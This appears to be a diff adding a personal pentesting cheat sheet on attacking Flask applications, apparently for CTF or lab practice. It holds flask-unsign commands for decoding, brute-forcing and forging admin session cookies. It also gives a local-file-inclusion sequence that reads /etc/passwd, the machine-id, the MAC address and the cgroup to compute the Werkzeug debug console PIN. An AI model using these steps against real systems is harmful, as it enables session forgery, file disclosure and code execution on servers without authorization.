@@ -1,0 +1,44 @@
+### Flask ###
+## links
+# https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask
+# https://www.kirsle.net/wizards/flask-session.cgi
+
+
+
+##############
+### cookie ###
+##############
+# on Kali: pipx install flask-unsign
+pip3 install flask-unsign
+flask-unsign -d -c 'COOKIE'						# decode cookie
+flask-unsign -w ~/perso/secu/dict/rockyou.txt -u -c 'COOKIE' -nE	# brute force
+flask-unsign --sign --cookie "{'logged_in': True}" --secret 'key'	# full param
+flask-unsign -s -c "{'admin': True}" -S 'KEY'				# sign new cookie
+flask-unsign -s -c "{'admin': True}" -S 'KEY' --legacy			# sign new cookie legacy
+
+
+
+####################
+## Werkzeug Debug ##
+####################
+# https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug
+# https://ctftime.org/writeup/17955
+/console
+
+## LFI
+/services?search=/etc/passwd					# get username
+/services?search=/proc/net/arp 					# get interface
+/services?search=/sys/class/net/eth0/address			# get MAC addr
+>>> print(0x0242ac110006)					# 02:42:ac:11:00:06 
+	2485377892358						# get mac int number
+/services?search=/etc/machine-id				# get machine ID
+/services?search=/proc/sys/kernel/random/boot_id		# OR get machine ID
+/services?search=/proc/self/cgroup				# concat with cgroup
+	12:pids:/user.slice/user-1045.slice/user@1045.service
+	=> user@1045.service					# value from cgroup
+/services?search=/usr/local/lib/python3.11/site-packages/flask/app.py # get full flask path
+/services?search=/usr/lib/python3.11/site-packages/flask/app.py	             # OR
+/services?search=/home/user/.local/lib/python3.11/site-packages/flask/app.py # OR
+
+# check code source, how to calculate pin
+/services?search=/usr/local/lib/python3.11/site-packages/werkzeug/debug/__init__.py
